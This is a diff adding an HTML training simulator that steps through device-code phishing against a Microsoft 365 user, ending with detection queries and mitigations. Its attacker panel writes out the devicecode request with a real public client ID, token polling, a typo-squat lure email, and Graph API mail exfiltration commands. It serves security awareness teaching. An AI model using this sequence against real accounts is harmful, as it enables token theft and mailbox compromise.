@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Device Code Phishing — Training Simulator</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;800&family=Fraunces:opsz,wght@9..144,400;9..144,700;9..144,900&family=Segoe+UI&display=swap');
+
+:root{
+  --bg:#0a0a0b;
+  --ink:#e8e6df;
+  --dim:#7a7770;
+  --acid:#9eff5a;
+  --acid-dim:#3a6a22;
+  --blood:#ff4757;
+  --warn:#ffb14a;
+  --paper:#fafafa;
+  --ms-blue:#0067b8;
+  --grid: rgba(158,255,90,.06);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;background:var(--bg);color:var(--ink);font-family:'JetBrains Mono',monospace;overflow:hidden}
+
+body::before{
+  content:'';position:fixed;inset:0;pointer-events:none;z-index:1000;
+  background:repeating-linear-gradient(0deg,rgba(0,0,0,0) 0,rgba(0,0,0,0) 2px,rgba(0,0,0,.18) 3px,rgba(0,0,0,0) 4px);
+}
+body::after{
+  content:'';position:fixed;inset:0;pointer-events:none;z-index:999;
+  background:radial-gradient(ellipse at center, transparent 50%, rgba(0,0,0,.5) 100%);
+}
+
+/* ===== TOP BAR ===== */
+.topbar{
+  position:fixed;top:0;left:0;right:0;height:54px;z-index:100;
+  background:#000;border-bottom:1px solid var(--acid-dim);
+  display:flex;align-items:center;padding:0 20px;gap:24px;
+}
+.topbar h1{
+  font-family:'Fraunces',serif;font-weight:900;font-size:18px;letter-spacing:-.02em;
+}
+.topbar h1 span{color:var(--blood)}
+.badge{
+  font-size:10px;padding:3px 8px;border:1px solid var(--warn);color:var(--warn);
+  letter-spacing:.15em;text-transform:uppercase;font-weight:600;
+}
+.legend{margin-left:auto;display:flex;gap:18px;font-size:11px;color:var(--dim)}
+.legend b{color:var(--acid)}
+.legend i{color:var(--ms-blue);font-style:normal}
+
+/* ===== MAIN SPLIT ===== */
+.stage{
+  position:fixed;top:54px;left:0;right:0;bottom:140px;
+  display:grid;grid-template-columns:1fr 8px 1fr;
+}
+.divider{
+  background:linear-gradient(180deg,var(--acid-dim),transparent,var(--acid-dim));
+  position:relative;
+}
+.divider::before{
+  content:'⇄';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+  background:var(--bg);color:var(--acid);font-size:14px;padding:6px 4px;
+}
+
+/* ===== ATTACKER PANEL ===== */
+.attacker{
+  background:#050505;
+  background-image:
+    linear-gradient(var(--grid) 1px, transparent 1px),
+    linear-gradient(90deg, var(--grid) 1px, transparent 1px);
+  background-size:24px 24px;
+  padding:18px 22px;overflow-y:auto;color:var(--acid);
+  text-shadow:0 0 8px rgba(158,255,90,.4);
+  position:relative;
+}
+.attacker::before{
+  content:'ATTACKER · KALI@10.0.0.13';
+  position:absolute;top:8px;right:14px;font-size:9px;
+  letter-spacing:.2em;color:var(--acid-dim);
+}
+.attacker h2{
+  font-family:'Fraunces',serif;font-style:italic;font-weight:400;font-size:13px;
+  color:var(--dim);margin-bottom:14px;letter-spacing:.05em;
+}
+.term{font-size:13px;line-height:1.7}
+.term .prompt{color:var(--acid-dim)}
+.term .prompt::before{content:'┌─[';color:var(--acid-dim)}
+.term .prompt::after{content:']─$ ';color:var(--acid-dim)}
+.term .cmd{color:var(--ink);text-shadow:none}
+.term .out{color:var(--acid);opacity:.85;display:block;margin:4px 0 12px;padding-left:14px;border-left:1px dashed var(--acid-dim)}
+.term .err{color:var(--blood);text-shadow:0 0 6px rgba(255,71,87,.4)}
+.term .ok{color:#5aff8e}
+.term .key{background:#1a1a1a;padding:2px 6px;border:1px dashed var(--acid);color:#fff;font-weight:600;display:inline-block}
+
+.tokenbox{
+  margin-top:14px;border:1px solid var(--blood);background:rgba(255,71,87,.06);
+  padding:12px;font-size:11px;
+}
+.tokenbox h3{color:var(--blood);font-size:11px;letter-spacing:.2em;margin-bottom:8px}
+.tokenbox div{word-break:break-all;color:#ff8a96;line-height:1.6;margin-bottom:6px}
+.tokenbox span{color:var(--dim)}
+
+/* ===== VICTIM PANEL ===== */
+.victim{
+  background:var(--paper);overflow-y:auto;font-family:'Segoe UI',system-ui,sans-serif;
+  color:#222;position:relative;
+}
+.victim::before{
+  content:'VICTIM · WIN11 · OUTLOOK';position:absolute;top:8px;right:14px;font-size:9px;
+  letter-spacing:.2em;color:#bbb;z-index:5;
+}
+.browser-chrome{
+  background:#e8e8e8;border-bottom:1px solid #ccc;padding:10px 14px;
+  display:flex;align-items:center;gap:10px;
+}
+.dots{display:flex;gap:6px}
+.dots span{width:11px;height:11px;border-radius:50%}
+.dots span:nth-child(1){background:#ff5f56}
+.dots span:nth-child(2){background:#ffbd2e}
+.dots span:nth-child(3){background:#27c93f}
+.urlbar{
+  flex:1;background:#fff;padding:5px 12px;border-radius:14px;font-size:12px;
+  color:#333;border:1px solid #d0d0d0;
+}
+.urlbar b{color:#0a7a32}
+.urlbar small{color:#888;margin-left:6px}
+
+.viewport{padding:0;min-height:calc(100% - 38px)}
+
+/* Email view */
+.email{padding:20px 28px;font-size:14px;line-height:1.55}
+.email .from{color:#666;font-size:12px;margin-bottom:4px}
+.email .from b{color:#222}
+.email .subj{font-size:18px;font-weight:600;margin:8px 0 18px;color:#111}
+.email .body p{margin-bottom:14px}
+.email .body a.fake{
+  color:var(--ms-blue);text-decoration:underline;cursor:pointer;
+}
+.email .stamp{
+  display:inline-block;background:#fff8db;color:#7a5a00;padding:2px 8px;
+  font-size:11px;border:1px solid #e6cf6a;margin-bottom:12px;
+}
+
+/* MS device login mock */
+.ms-page{
+  padding:0;background:#fff;min-height:100%;
+  display:flex;flex-direction:column;align-items:center;padding-top:40px;
+}
+.ms-logo{display:flex;align-items:center;gap:6px;margin-bottom:8px}
+.ms-logo div{width:9px;height:9px}
+.ms-card{
+  width:340px;background:#fff;border:1px solid #ddd;padding:38px 40px;
+  box-shadow:0 2px 6px rgba(0,0,0,.08);
+}
+.ms-card h3{font-size:22px;font-weight:600;color:#1b1b1b;margin-bottom:6px}
+.ms-card p{font-size:13px;color:#444;margin-bottom:18px;line-height:1.5}
+.ms-card input{
+  width:100%;padding:8px 10px;border:1px solid #666;font-size:14px;
+  font-family:inherit;outline:none;
+}
+.ms-card input:focus{border-color:var(--ms-blue);border-width:2px;padding:7px 9px}
+.ms-card button{
+  margin-top:24px;background:var(--ms-blue);color:#fff;border:0;padding:8px 22px;
+  font-size:14px;cursor:pointer;float:right;
+}
+.ms-card button:hover{background:#005ba1}
+.ms-card .signed-as{
+  font-size:13px;color:#444;border-bottom:1px solid #eee;padding-bottom:14px;margin-bottom:18px;
+}
+.ms-card .signed-as b{display:block;color:#111;font-weight:600;margin-bottom:2px}
+.ms-card .consent{font-size:12px;color:#555;line-height:1.5;margin-bottom:14px}
+.ms-card .consent b{color:#111}
+.ms-card .scope{
+  font-size:11px;color:#666;background:#f3f3f3;padding:8px;margin:10px 0;
+}
+.ms-card .scope ul{padding-left:18px;margin-top:4px}
+.ms-success{
+  text-align:center;padding:40px 20px;
+}
+.ms-success .check{
+  width:54px;height:54px;border-radius:50%;background:#107c10;color:#fff;
+  display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 14px;
+}
+
+/* ===== TIMELINE / CONTROLS ===== */
+.controls{
+  position:fixed;bottom:0;left:0;right:0;height:140px;
+  background:linear-gradient(180deg,#000,#0a0a0b);
+  border-top:1px solid var(--acid-dim);padding:14px 24px;z-index:100;
+}
+.timeline{
+  display:grid;grid-template-columns:repeat(6,1fr);gap:6px;margin-bottom:14px;
+}
+.tl-step{
+  background:#111;border:1px solid #222;padding:8px 10px;font-size:10px;
+  cursor:pointer;transition:.2s;position:relative;
+}
+.tl-step:hover{border-color:var(--acid-dim)}
+.tl-step.active{border-color:var(--acid);background:rgba(158,255,90,.08);box-shadow:0 0 12px rgba(158,255,90,.3)}
+.tl-step.done{border-color:var(--acid-dim)}
+.tl-step.done::after{content:'✓';position:absolute;top:4px;right:6px;color:var(--acid);font-size:10px}
+.tl-step .num{
+  font-family:'Fraunces',serif;font-size:18px;font-weight:900;color:var(--dim);
+}
+.tl-step.active .num{color:var(--acid)}
+.tl-step .lbl{display:block;color:var(--ink);margin-top:2px;line-height:1.2;font-size:10px}
+.tl-step.active .lbl{color:#fff}
+
+.btnrow{display:flex;gap:10px;align-items:center}
+.btn{
+  background:transparent;border:1px solid var(--acid-dim);color:var(--acid);
+  padding:8px 18px;font-family:inherit;font-size:12px;cursor:pointer;
+  letter-spacing:.1em;text-transform:uppercase;transition:.2s;
+}
+.btn:hover{background:var(--acid);color:#000;border-color:var(--acid)}
+.btn.primary{background:var(--acid);color:#000;border-color:var(--acid);font-weight:600}
+.btn.primary:hover{background:#fff;border-color:#fff}
+.btn.ghost{border-color:#333;color:var(--dim)}
+.btn.ghost:hover{background:#222;color:var(--ink);border-color:#444}
+.btn:disabled{opacity:.3;cursor:not-allowed}
+
+.narration{
+  flex:1;font-size:11px;color:var(--warn);padding:6px 14px;
+  border:1px dashed var(--warn);background:rgba(255,177,74,.05);min-height:34px;
+  display:flex;align-items:center;line-height:1.4;
+}
+.narration b{color:#fff}
+
+/* ===== ANNOTATION OVERLAY ===== */
+.anno{
+  position:absolute;background:rgba(0,0,0,.92);border:1px solid var(--blood);
+  color:#fff;padding:10px 14px;font-family:'JetBrains Mono',monospace;font-size:11px;
+  max-width:280px;line-height:1.5;z-index:50;animation:fadeIn .4s ease;
+}
+.anno::before{
+  content:attr(data-tag);position:absolute;top:-9px;left:10px;
+  background:var(--blood);color:#fff;padding:1px 8px;font-size:9px;
+  letter-spacing:.2em;font-weight:700;
+}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+.cursor{display:inline-block;width:8px;height:14px;background:var(--acid);animation:blink 1s infinite}
+@keyframes blink{50%{opacity:0}}
+
+/* mobile */
+@media(max-width:900px){
+  .stage{grid-template-columns:1fr;grid-template-rows:1fr 8px 1fr;bottom:200px}
+  .divider{background:linear-gradient(90deg,var(--acid-dim),transparent,var(--acid-dim))}
+  .controls{height:200px}
+  .timeline{grid-template-columns:repeat(3,1fr)}
+}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <h1>DEVICE CODE <span>PHISH</span> — RFC 8628 ABUSE LAB</h1>
+  <span class="badge">Training · No Live Endpoints</span>
+  <div class="legend">
+    <span><b>■</b> Attacker terminal</span>
+    <span><i>■</i> Victim browser (real MS domain)</span>
+  </div>
+</div>
+
+<div class="stage">
+
+  <!-- ATTACKER -->
+  <div class="attacker" id="attacker">
+    <h2>// Phase 0 · idle. Press START to launch the campaign.</h2>
+    <div class="term" id="term"></div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- VICTIM -->
+  <div class="victim" id="victim">
+    <div class="browser-chrome">
+      <div class="dots"><span></span><span></span><span></span></div>
+      <div class="urlbar" id="urlbar"><b>🔒 about:blank</b></div>
+    </div>
+    <div class="viewport" id="viewport">
+      <div style="padding:60px 30px;text-align:center;color:#888;font-size:13px">
+        Victim browser idle.<br>The campaign hasn't started yet.
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- CONTROLS -->
+<div class="controls">
+  <div class="timeline" id="timeline">
+    <div class="tl-step" data-step="0"><span class="num">0</span><span class="lbl">Attacker requests<br>device code</span></div>
+    <div class="tl-step" data-step="1"><span class="num">1</span><span class="lbl">Phishing email<br>delivered</span></div>
+    <div class="tl-step" data-step="2"><span class="num">2</span><span class="lbl">Victim visits<br>real MS page</span></div>
+    <div class="tl-step" data-step="3"><span class="num">3</span><span class="lbl">Victim authenticates<br>+ MFA</span></div>
+    <div class="tl-step" data-step="4"><span class="num">4</span><span class="lbl">Tokens issued<br>to attacker</span></div>
+    <div class="tl-step" data-step="5"><span class="num">5</span><span class="lbl">Post-compromise<br>access</span></div>
+  </div>
+  <div class="btnrow">
+    <button class="btn primary" id="nextBtn">▶ Start campaign</button>
+    <button class="btn ghost" id="resetBtn">↺ Reset</button>
+    <button class="btn ghost" id="autoBtn">⏵ Auto-play</button>
+    <div class="narration" id="narration">
+      Click <b>Start campaign</b> to walk through how an attacker abuses RFC 8628's device authorization grant against a Microsoft 365 user.
+    </div>
+  </div>
+</div>
+
+<script>
+// ============ STATE ============
+const state = { step: -1, auto: false, autoTimer: null };
+
+// generate fake codes
+function rand(n,chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789'){
+  return Array.from({length:n},()=>chars[Math.floor(Math.random()*chars.length)]).join('');
+}
+const userCode = rand(4)+'-'+rand(4);
+const deviceCode = 'GMMhmhCxhwEABAA' + rand(40,'abcdef0123456789ABCDEF');
+const accessToken = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6Ijk3M3...' + rand(20,'abcdefghijklmnopqrstuvwxyz0123456789') + '...truncated';
+const refreshToken = '0.AVcAS-d-...' + rand(32,'abcdefghijklmnopqrstuvwxyz0123456789-_');
+
+// ============ ELEMENTS ============
+const term = document.getElementById('term');
+const viewport = document.getElementById('viewport');
+const urlbar = document.getElementById('urlbar');
+const narration = document.getElementById('narration');
+const nextBtn = document.getElementById('nextBtn');
+const resetBtn = document.getElementById('resetBtn');
+const autoBtn = document.getElementById('autoBtn');
+const tlSteps = document.querySelectorAll('.tl-step');
+const attackerH2 = document.querySelector('.attacker h2');
+
+// ============ STEPS ============
+const steps = [
+  // ===== STEP 0 =====
+  {
+    title: '// Phase 0 · Initiate device code request',
+    narration: '<b>STEP 0:</b> The attacker hits Microsoft\'s legitimate <code>/oauth2/v2.0/devicecode</code> endpoint with a public client ID (e.g. Azure CLI, Microsoft Office). MS returns a user_code and device_code. <b>No password needed yet.</b>',
+    attacker: () => {
+      appendTerm('<span class="prompt">attacker@kali ~/phish</span><span class="cmd">curl -X POST \\</span>');
+      appendTerm('<span class="cmd">  https://login.microsoftonline.com/common/oauth2/v2.0/devicecode \\</span>');
+      appendTerm('<span class="cmd">  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \\</span>');
+      appendTerm('<span class="cmd">  -d "scope=user.read mail.read files.read offline_access"</span>');
+      setTimeout(()=>{
+        appendTerm(`<span class="out">{
+  "user_code": "<span class="key">${userCode}</span>",
+  "device_code": "${deviceCode.slice(0,40)}...",
+  "verification_uri": "https://microsoft.com/devicelogin",
+  "expires_in": 900,
+  "interval": 5
+}</span>`);
+        appendTerm('<span class="prompt">attacker@kali ~/phish</span><span class="cmd">python3 poll_token.py --code ${userCode} &</span>');
+        appendTerm('<span class="out ok">[+] Polling token endpoint every 5s... waiting for victim.<span class="cursor"></span></span>');
+      }, 600);
+    },
+    victim: () => {
+      viewport.innerHTML = `<div style="padding:60px 30px;text-align:center;color:#888;font-size:13px">
+        Victim is at their desk.<br>Email client running. No suspicious activity yet.
+      </div>`;
+      urlbar.innerHTML = '<b>🔒 about:blank</b>';
+    }
+  },
+
+  // ===== STEP 1 =====
+  {
+    title: '// Phase 1 · Deliver lure',
+    narration: '<b>STEP 1:</b> The attacker sends a phishing email impersonating IT or a vendor. The lure links to the <b>real</b> microsoft.com domain — that\'s what makes this so dangerous. URL filters and reputation checks pass.',
+    attacker: () => {
+      appendTerm('<span class="prompt">attacker@kali ~/phish</span><span class="cmd">./gophish send --target eric@victimco.nz \\</span>');
+      appendTerm('<span class="cmd">  --template "ms-teams-update.html" \\</span>');
+      appendTerm(`<span class="cmd">  --code ${userCode}</span>`);
+      setTimeout(()=>{
+        appendTerm('<span class="out ok">[+] Email queued. SPF/DKIM via compromised tenant relay.</span>');
+        appendTerm('<span class="out ok">[+] Delivered to victimco.nz inbox @ ' + new Date().toLocaleTimeString() + '</span>');
+      }, 500);
+    },
+    victim: () => {
+      urlbar.innerHTML = '<b>🔒 outlook.office.com</b><small>/mail/inbox</small>';
+      viewport.innerHTML = `
+        <div class="email">
+          <div class="from"><b>IT Support</b> &lt;it-support@<span style="color:#c00">microsft-teams.com</span>&gt;</div>
+          <div class="from">to: eric@victimco.nz</div>
+          <div class="subj">⚠ Action required: Verify your Microsoft Teams session</div>
+          <span class="stamp">📎 SPF: PASS · DKIM: PASS</span>
+          <div class="body">
+            <p>Hi Eric,</p>
+            <p>Our security system detected your Microsoft Teams session needs re-authentication after our recent tenant migration. Please verify within <b>15 minutes</b> to avoid losing access.</p>
+            <p>Go to <a class="fake" id="phishlink">https://microsoft.com/devicelogin</a> and enter the code below:</p>
+            <p style="background:#f4f4f4;padding:14px;text-align:center;font-size:22px;font-family:monospace;letter-spacing:.2em;border:1px dashed #999"><b>${userCode}</b></p>
+            <p style="font-size:11px;color:#888">— IT Support · This is an automated message.</p>
+          </div>
+          <div class="anno" data-tag="RED FLAGS" style="position:relative;margin-top:20px;max-width:none">
+            ① Sender domain is <b>microsft-teams.com</b> (typo-squat), not microsoft.com<br>
+            ② Artificial urgency ("15 minutes")<br>
+            ③ Legitimate IT never sends device codes via email<br>
+            ④ But the link itself goes to a <b>real</b> Microsoft URL — bypasses link scanners
+          </div>
+        </div>
+      `;
+      document.getElementById('phishlink')?.addEventListener('click',e=>{
+        e.preventDefault();
+        if(state.step===1) advance();
+      });
+    }
+  },
+
+  // ===== STEP 2 =====
+  {
+    title: '// Phase 2 · Victim opens real MS page',
+    narration: '<b>STEP 2:</b> Victim clicks. Lands on Microsoft\'s genuine devicelogin page (HTTPS, valid cert, real domain). They paste the attacker\'s code. Microsoft has no way to know who initiated this code.',
+    attacker: () => {
+      appendTerm('<span class="out" style="color:var(--warn)">[~] Still polling... no token yet (authorization_pending)</span>');
+    },
+    victim: () => {
+      urlbar.innerHTML = '<b>🔒 microsoft.com</b><small>/devicelogin</small>';
+      viewport.innerHTML = `
+        <div class="ms-page">
+          <div class="ms-logo">
+            <div style="background:#f25022"></div><div style="background:#7fba00"></div>
+            <div style="background:#00a4ef"></div><div style="background:#ffb900"></div>
+            <span style="margin-left:6px;font-size:14px;color:#333">Microsoft</span>
+          </div>
+          <div class="ms-card">
+            <h3>Enter code</h3>
+            <p>Enter the code displayed on your app or device.</p>
+            <input id="codeinput" placeholder="Code" maxlength="9" style="text-transform:uppercase">
+            <button id="submitcode">Next</button>
+            <div style="clear:both"></div>
+          </div>
+          <div class="anno" data-tag="GENUINE" style="position:relative;margin-top:20px;max-width:340px">
+            This <b>is</b> the real Microsoft page. HTTPS, valid cert, no MITM. The danger is the <b>flow itself</b> — Microsoft trusts that whoever holds the user_code is allowed to receive tokens for whoever signs in.
+          </div>
+        </div>
+      `;
+      document.getElementById('codeinput').value = userCode;
+      document.getElementById('submitcode').addEventListener('click',()=>{
+        if(state.step===2) advance();
+      });
+    }
+  },
+
+  // ===== STEP 3 =====
+  {
+    title: '// Phase 3 · Victim authenticates with MFA',
+    narration: '<b>STEP 3:</b> Victim signs in on the real Microsoft page with their real password and approves MFA on their phone. Conditional Access policies pass — from the user\'s side, everything looks normal. Then they consent to the OAuth scopes.',
+    attacker: () => {
+      appendTerm('<span class="out" style="color:var(--warn)">[~] Polling... authorization_pending</span>');
+    },
+    victim: () => {
+      urlbar.innerHTML = '<b>🔒 login.microsoftonline.com</b><small>/common/oauth2/...</small>';
+      viewport.innerHTML = `
+        <div class="ms-page">
+          <div class="ms-logo">
+            <div style="background:#f25022"></div><div style="background:#7fba00"></div>
+            <div style="background:#00a4ef"></div><div style="background:#ffb900"></div>
+            <span style="margin-left:6px;font-size:14px;color:#333">Microsoft</span>
+          </div>
+          <div class="ms-card">
+            <div class="signed-as"><b>eric@victimco.nz</b><span style="color:#666">✅ MFA verified via Authenticator</span></div>
+            <h3 style="font-size:16px">Permissions requested</h3>
+            <div class="consent">
+              <b>Microsoft Office</b><br>
+              <span style="font-size:11px;color:#666">apps.azure.com</span>
+            </div>
+            <p style="font-size:12px;color:#444;margin:14px 0 6px">This app would like to:</p>
+            <div class="scope">
+              <ul>
+                <li>Sign you in and read your profile</li>
+                <li>Read your mail</li>
+                <li>Read your files</li>
+                <li><b>Maintain access to data you've given it access to</b> ← refresh token!</li>
+              </ul>
+            </div>
+            <p style="font-size:11px;color:#888">Accepting these permissions means you allow this app to use your data as specified in their terms of service and privacy statement.</p>
+            <button id="acceptbtn">Accept</button>
+            <button style="background:#fff;color:#333;border:1px solid #ccc;margin-right:8px" id="cancelbtn">Cancel</button>
+            <div style="clear:both"></div>
+          </div>
+          <div class="anno" data-tag="THE TRAP" style="position:relative;margin-top:20px;max-width:340px">
+            Note <b>"Maintain access"</b> — that's the <code>offline_access</code> scope. It grants a <b>refresh token</b> the attacker can use for ~90 days, surviving password resets unless explicitly revoked.
+          </div>
+        </div>
+      `;
+      document.getElementById('acceptbtn').addEventListener('click',()=>{
+        if(state.step===3) advance();
+      });
+    }
+  },
+
+  // ===== STEP 4 =====
+  {
+    title: '// Phase 4 · Tokens delivered to attacker',
+    narration: '<b>STEP 4:</b> The attacker\'s polling script gets back a 200 with access_token + refresh_token. <b>The attacker now has the victim\'s identity</b> — without ever touching the password or MFA challenge.',
+    attacker: () => {
+      appendTerm('<span class="out ok">[+] HTTP 200 OK from /oauth2/v2.0/token</span>');
+      appendTerm('<span class="out ok" style="color:#5aff8e">[+] ACCESS GRANTED ─ tokens captured</span>');
+      const box = document.createElement('div');
+      box.className='tokenbox';
+      box.innerHTML=`
+        <h3>🔓 STOLEN CREDENTIALS</h3>
+        <div><span>access_token:</span><br>${accessToken}</div>
+        <div><span>refresh_token:</span><br>${refreshToken}</div>
+        <div><span>expires_in:</span> 3599 sec · <span>scope:</span> User.Read Mail.Read Files.Read offline_access</div>
+      `;
+      term.appendChild(box);
+    },
+    victim: () => {
+      urlbar.innerHTML = '<b>🔒 microsoft.com</b><small>/devicelogin</small>';
+      viewport.innerHTML = `
+        <div class="ms-page">
+          <div class="ms-card ms-success">
+            <div class="check">✓</div>
+            <h3 style="font-size:18px">You have signed in to the Microsoft Office application on your device. You may now close this window.</h3>
+          </div>
+          <div class="anno" data-tag="VICTIM POV" style="position:relative;margin-top:20px;max-width:340px">
+            From Eric\'s perspective: nothing seems wrong. He authenticated on a legitimate page, MFA worked, IT said to do it. He closes the tab and gets back to work.
+          </div>
+        </div>
+      `;
+    }
+  },
+
+  // ===== STEP 5 =====
+  {
+    title: '// Phase 5 · Post-compromise',
+    narration: '<b>STEP 5:</b> Attacker uses the access token against Microsoft Graph. Reads mail, exfiltrates OneDrive, enumerates the directory. The refresh token gives persistence. <b>This activity appears in logs as the legitimate user from a "trusted" Microsoft client app.</b>',
+    attacker: () => {
+      appendTerm('<span class="prompt">attacker@kali ~/phish</span><span class="cmd">curl -H "Authorization: Bearer $TOKEN" \\</span>');
+      appendTerm('<span class="cmd">  https://graph.microsoft.com/v1.0/me/messages?$top=50</span>');
+      setTimeout(()=>{
+        appendTerm(`<span class="out">{
+  "value": [
+    {"subject":"Q1 financial forecast - confidential","from":"cfo@victimco.nz"},
+    {"subject":"Re: AWS root credentials rotation","from":"devops@victimco.nz"},
+    {"subject":"VPN config + temp password","from":"it@victimco.nz"},
+    ... 47 more
+  ]
+}</span>`);
+        appendTerm('<span class="prompt">attacker@kali ~/phish</span><span class="cmd">./graph_dump.py --target eric --modules mail,files,contacts</span>');
+        appendTerm('<span class="out err">[!] EXFIL: 1,247 emails · 89 files (412 MB) · 340 contacts → /loot/eric/</span>');
+        appendTerm('<span class="out err">[!] Persistence: refresh_token valid until ' + new Date(Date.now()+90*864e5).toISOString().slice(0,10) + '</span>');
+      }, 700);
+    },
+    victim: () => {
+      viewport.innerHTML = `
+        <div class="email" style="padding:30px">
+          <h2 style="font-family:Fraunces,serif;font-size:20px;margin-bottom:14px;color:#222">📊 Detection & defence</h2>
+          <div style="background:#f7f7f7;padding:16px;border-left:3px solid #c00;margin-bottom:14px;font-size:13px;line-height:1.6">
+            <b style="color:#c00">In Microsoft Sentinel / Entra logs, you would see:</b>
+            <ul style="margin-top:8px;padding-left:20px">
+              <li>SignInLogs: <code>AuthenticationProtocol = "deviceCode"</code></li>
+              <li>App: <code>Microsoft Office</code> (or whichever public client_id was abused)</li>
+              <li>Sign-in IP <b>matches the user's normal IP</b> (because they did sign in)</li>
+              <li>Token usage from a different IP shortly after — the giveaway</li>
+            </ul>
+          </div>
+          <div style="background:#eaf6ea;padding:16px;border-left:3px solid #107c10;font-size:13px;line-height:1.6">
+            <b style="color:#107c10">Mitigations:</b>
+            <ul style="margin-top:8px;padding-left:20px">
+              <li><b>Conditional Access policy</b> blocking <code>authenticationProtocol = deviceCode</code> for users who don't need it</li>
+              <li>Require <b>compliant device</b> or <b>Hybrid Azure AD join</b></li>
+              <li>Hunt KQL: <code>SigninLogs | where AuthenticationProtocol == "deviceCode"</code></li>
+              <li>User training: <b>never enter a device code you didn't generate yourself</b></li>
+              <li>Reduce token lifetimes; revoke refresh tokens on suspicious activity</li>
+              <li>Monitor for new app consents (especially <code>offline_access</code> + Mail/Files scopes)</li>
+            </ul>
+          </div>
+          <p style="margin-top:18px;font-size:12px;color:#666;font-style:italic">References: RFC 8628 §6 (Security Considerations) · Microsoft "Token theft playbook" · MITRE ATT&CK T1528 (Steal Application Access Token)</p>
+        </div>
+      `;
+    }
+  }
+];
+
+// ============ ENGINE ============
+function appendTerm(html){
+  const div = document.createElement('div');
+  div.innerHTML = html;
+  term.appendChild(div);
+  document.getElementById('attacker').scrollTop = 9999;
+}
+
+function renderStep(i){
+  if(i<0||i>=steps.length) return;
+  state.step = i;
+  const s = steps[i];
+  attackerH2.textContent = s.title;
+  narration.innerHTML = s.narration;
+  s.attacker();
+  s.victim();
+  tlSteps.forEach((el,idx)=>{
+    el.classList.toggle('active', idx===i);
+    el.classList.toggle('done', idx<i);
+  });
+  nextBtn.textContent = (i===steps.length-1) ? '✓ Complete' : '▶ Next phase';
+  nextBtn.disabled = (i===steps.length-1);
+}
+
+function advance(){
+  if(state.step < steps.length-1){
+    if(state.step===-1) term.innerHTML='';
+    renderStep(state.step+1);
+  }
+}
+
+function reset(){
+  state.step = -1;
+  state.auto = false;
+  if(state.autoTimer){clearInterval(state.autoTimer);state.autoTimer=null}
+  autoBtn.textContent = '⏵ Auto-play';
+  term.innerHTML = '';
+  attackerH2.textContent = '// Phase 0 · idle. Press START to launch the campaign.';
+  narration.innerHTML = 'Click <b>Start campaign</b> to walk through how an attacker abuses RFC 8628\'s device authorization grant against a Microsoft 365 user.';
+  nextBtn.textContent = '▶ Start campaign';
+  nextBtn.disabled = false;
+  urlbar.innerHTML = '<b>🔒 about:blank</b>';
+  viewport.innerHTML = `<div style="padding:60px 30px;text-align:center;color:#888;font-size:13px">
+    Victim browser idle.<br>The campaign hasn't started yet.
+  </div>`;
+  tlSteps.forEach(el=>{el.classList.remove('active','done')});
+}
+
+function toggleAuto(){
+  if(state.auto){
+    state.auto=false;clearInterval(state.autoTimer);state.autoTimer=null;
+    autoBtn.textContent='⏵ Auto-play';
+  } else {
+    state.auto=true;autoBtn.textContent='⏸ Pause';
+    if(state.step===-1) advance();
+    state.autoTimer = setInterval(()=>{
+      if(state.step>=steps.length-1){toggleAuto();return}
+      advance();
+    }, 4500);
+  }
+}
+
+// ============ EVENTS ============
+nextBtn.addEventListener('click',advance);
+resetBtn.addEventListener('click',reset);
+autoBtn.addEventListener('click',toggleAuto);
+tlSteps.forEach(el=>{
+  el.addEventListener('click',()=>{
+    const i = parseInt(el.dataset.step);
+    if(state.auto) toggleAuto();
+    term.innerHTML='';
+    state.step = i-1;
+    renderStep(i);
+  });
+});
+
+// keyboard
+document.addEventListener('keydown',e=>{
+  if(e.key==='ArrowRight'||e.key===' '){e.preventDefault();advance()}
+  if(e.key==='r'||e.key==='R') reset();
+});
+
+</script>
+</body>
+</html>
